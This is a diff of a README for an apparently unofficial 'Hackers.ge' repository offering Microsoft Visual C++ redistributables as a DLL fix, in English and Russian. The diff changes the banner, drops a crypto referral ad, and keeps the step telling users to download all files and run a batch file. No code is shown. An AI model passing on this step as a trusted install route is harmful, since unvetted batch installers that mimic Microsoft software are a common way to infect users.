@@ -1,14 +1,13 @@
-<p align="center"><img width="728" height="90" src="https://media.giphy.com/media/NcSRM70PbxRbR0PMZJ/giphy.gif"> <br> <b> <a href="https://hackers.ge"> H A C K E R S
+<p align="center">
+<a href="https://hackers.ge" target="_blank" rel="noopener noreferrer">
+  <img style="max-width: 100%;" src="https://media.giphy.com/media/NcSRM70PbxRbR0PMZJ/giphy.gif" alt="Hackers.ge">
+</a>
 
 # Microsoft Visual C++ Drivers 2015, 2017, 2019, and 2022
 
-First of all Download All files and then Click "Installer - Enter Here.bat" FILE 
+First of all Download All files and then Click "bat" FILE 
 <hr>
-<p align="center">
-  <a href="https://www.gate.io/ref/3301721" target="_blank"><img width="480" height="150" src="https://media.giphy.com/media/r5PH7oEtPW7hCnZiWN/giphy.gif"> CryptoERA
-</p>
 
----------------------
 
 🇬🇧 DLL Files Problems FIX | These libraries are required by many applications built by using Microsoft C and C++ tools.
 
@@ -16,7 +15,7 @@ First of all Download All files and then Click "Installer - Enter Here.bat" FILE
 
 🇷🇺 Исправить Проблемы с файлами DLL | Эти библиотеки требуются для многих приложений, созданных с использованием инструментов Microsoft C и C ++
 
----------------------
+<hr>
 
 These libraries are required by many applications built by using Microsoft C and C++ tools, Microsoft Visual C++ Redistributable Packages
 
